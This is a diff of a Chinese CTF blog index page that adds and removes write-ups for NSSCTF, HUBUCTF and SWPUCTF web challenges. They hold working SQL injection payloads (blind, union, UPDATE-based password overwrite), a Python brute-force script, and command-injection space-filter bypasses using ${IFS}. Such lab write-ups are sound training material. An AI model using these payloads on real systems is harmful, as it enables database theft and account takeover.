@@ -131,6 +131,93 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/13/NSSCTF2022-babysql-wp/" >NSSCTF2022-babysql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-13
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2075">题目链接</a></p>
+<p>查询成功会输出 <code>前有flag...</code></p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/13/NSSCTF2022-babysql-wp/0x1.png?raw=true" alt="img">   </p>
+<p>发现空格、注释符都被过滤   空格可用&#x2F;**&#x2F;替换</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/13/NSSCTF2022-babysql-wp/0x2.png?raw=true" alt="img">   </p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><p>由于不可注释  最右会剩下一个没有闭合的单引号  可以构造bool盲注按照回显爆破信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=tarnisha<span class="string">&#x27;/**/or/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="comment">/**/</span>	<span class="comment">// √</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">alpha = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;,#$&amp;&#x27;()*+-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">pswd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        post_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">f&quot;tarnisha&#x27;/**/or/**/database()/**/like/**/&#x27;<span class="subst">&#123;pswd+i&#125;</span>%&quot;</span>&#125;</span><br><span class="line">        response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28793/&quot;</span>, data=post_data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            pswd += i</span><br><span class="line">            <span class="built_in">print</span>(pswd)</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>常规流程查看数据库、表名、列名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tarnisha<span class="string">&#x27;/**/or/**/database()/**/like/**/&#x27;</span>&#123;pswd+i&#125;%	<span class="comment">// test</span></span><br><span class="line">tarnisha<span class="string">&#x27;/**/or/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;</span>test<span class="string">&#x27;)/**/like/**/&#x27;</span>&#123;pswd+i&#125;%	<span class="comment">// flag,users</span></span><br><span class="line">tarnisha<span class="string">&#x27;/**/or/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;</span>flag<span class="string">&#x27;)/**/like/**/&#x27;</span>&#123;pswd+i&#125;%		<span class="comment">// flag</span></span><br><span class="line">tarnisha<span class="string">&#x27;/**/or/**/(select/**/group_concat(flag)/**/from/**/test.flag)/**/like/**/&#x27;</span>&#123;pswd+i&#125;% 	<span class="comment">// [_____[__[__[__c__,nssctf_884ed7db-9884-4e11-bd55-ae7a0e385a9f_</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/13/NSSCTF2022-babysql-wp/0x3.png?raw=true" alt="img">  </p>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>直接联合注入也可以  因为用户名找不到就直接使用联合后半部分的结果输出了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/database()/**/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后还是常规流程   注意最后展示flag要用substr截取  否则不知道为什么无法成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/substr((select/**/group_concat(flag)/**/from/**/flag),1,60)/**/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/07/13/NSSCTF2022-babysql-wp/0x4.png?raw=true" alt="img">  </p>
+
+	
+	</div>
+  <a type="button" href="/2023/07/13/NSSCTF2022-babysql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/07/13/HUBUCTF2022-ezsql-wp/" >HUBUCTF2022-ezsql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-13
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2603">题目链接</a></p>
+<p>题目描述：好想知道admin的密码呜呜呜~</p>
+<h2 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h2><p>注册登入发现可以更新个人信息   其中age字段存在update注入，可通过描述字段查看所需信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="number">1</span>)%<span class="number">23</span>	<span class="comment">// 1</span></span><br><span class="line"><span class="number">2</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">// 查看数据库   demo2</span></span><br><span class="line"><span class="number">3</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">//查看表 users</span></span><br><span class="line"><span class="number">4</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x7573657273</span>)%<span class="number">23</span>    <span class="comment">//查看列 id,username,password,nickname,age,description		（注意此处users会导致更新错误 替换为url编码）</span></span><br><span class="line"><span class="number">5</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(password) users)%<span class="number">23</span>	<span class="comment">// 0cc175b9c0f1b6a831c399e269772661 为md5格式</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修改password"><a href="#修改password" class="headerlink" title="修改password"></a>修改password</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>. nickname=hhh&amp;age=<span class="number">23</span>, password=<span class="number">0x3230326362393632616335393037356239363462303731353264323334623730</span>%<span class="number">23</span> <span class="comment">// 0x32...30 == hex(md5(&#x27;123&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h3><p>username: admin password: 123</p>
+<p>这里description是被覆盖过的，因为前面执行 [5] 的时候是对所有用户进行操作，使得description为password</p>
+<p>可以看到description: 5a64edabc9358c603103053a3c600a88 爆破可得原始密码为 <code>iamcool</code> </p>
+<p>需要重开环境直接  1.修改密码[6]再登录 2.iamcool登录</p>
+
+	
+	</div>
+  <a type="button" href="/2023/07/13/HUBUCTF2022-ezsql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/12/第五空间2021-yasqlin-wp/" >第五空间2021-yet_another_mysql_injection-wp</a>
 								</h3>
 							</div>
@@ -475,73 +562,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/06/SWPUCTF2021-sql-wp/" >SWPUCTF2021-sql-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-06
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/442">题目链接</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空格和等号都被过滤 </span></span><br><span class="line"><span class="comment"># 空格替换为 /**/</span></span><br><span class="line"><span class="comment"># 等号替换为 like</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看列数、数据库名</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;order/**/by/**/3%23</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,database()%<span class="number">23</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看表名发现有LTLT_flag</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/&#x27;</span>test_d<span class="string">b&#x27;%23  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看LTLT_flag中列名发现有flag</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)/**/<span class="keyword">from</span>/**/information_schema.columns/**/where/**/table_name/**/like/**/<span class="string">&#x27;LTLT_flag&#x27;</span>%<span class="number">23</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看flag 但是发现有长度截取</span></span><br><span class="line">?wllm=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># substr substring right reverse都被屏蔽  发现mid可用（相当于substr）  一组组获取flag</span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span>union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,mid(group_concat(flag),<span class="number">1</span>,<span class="number">20</span>)/**/<span class="keyword">from</span>/**/test_db.LTLT_flag%<span class="number">23</span>  </span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/06/SWPUCTF2021-sql-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/06/SWPUCTF2021-babyrce-wp/" >SWPUCTF2021-babyrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-06
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/425">题目链接</a>   </p>
-<h3 id="页面内容"><a href="#页面内容" class="headerlink" title="页面内容"></a>页面内容</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> 小饼干最好吃啦！</span><br></pre></td></tr></table></figure>
-
-<h3 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;admin&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">&quot;http://node1.anna.nssctf.cn:28246/&quot;</span>, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 rasalghul.php</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="访问rasalghul-php-有"><a href="#访问rasalghul-php-有" class="headerlink" title="访问rasalghul.php 有"></a>访问rasalghul.php 有</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<h3 id="代码执行-空格绕过得到flag"><a href="#代码执行-空格绕过得到flag" class="headerlink" title="代码执行 空格绕过得到flag"></a>代码执行 空格绕过得到flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg;</span><br></pre></td></tr></table></figure>
-
-<h3 id="补充-空格绕过-："><a href="#补充-空格绕过-：" class="headerlink" title="补充 [空格绕过]："></a>补充 [空格绕过]：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$9</span></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2023/07/06/SWPUCTF2021-babyrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -603,7 +623,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>52</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>54</span></a></li>
 		
 		</ul>
 	</div>
@@ -614,48 +634,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
+			<li><a href="/tags/php/">php<span>23</span></a></li>
 		
-			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
+			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
 		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
 		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>8</span></a></li>
-		
-			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
-		
-			<li><a href="/tags/heap/">heap<span>4</span></a></li>
-		
-			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
 		
 			<li><a href="/tags/upload/">upload<span>4</span></a></li>
 		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
 		
-			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
-		
-			<li><a href="/tags/php/">php<span>23</span></a></li>
-		
-			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
-		
-			<li><a href="/tags/原型链污染/">原型链污染<span>1</span></a></li>
-		
-			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
-		
-			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
+			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
 		
 			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
 		
-			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
+		
+			<li><a href="/tags/stack/">stack<span>10</span></a></li>
+		
+			<li><a href="/tags/二次编码绕过/">二次编码绕过<span>1</span></a></li>
+		
+			<li><a href="/tags/swampctf2019/">swampctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+		
+			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/Hack-The-Box/">Hack The Box<span>1</span></a></li>
+		
+			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>121</span></a></li>
+		   <li><a href="/tags">...<span>124</span></a></li>
 		 
 		</ul>
 	</div>
@@ -666,6 +686,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/01/11/HTB-bizness-wp/" ><i class="fa fa-file-o"></i>HTB-bizness-wp</a>
+      </li>
     
       <li>
         <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
@@ -681,10 +705,6 @@
     
       <li>
         <a href="/2023/12/25/ejs原型链污染RCE/" ><i class="fa fa-file-o"></i>ejs原型链污染RCE</a>
-      </li>
-    
-      <li>
-        <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
       </li>
     
   </ul>
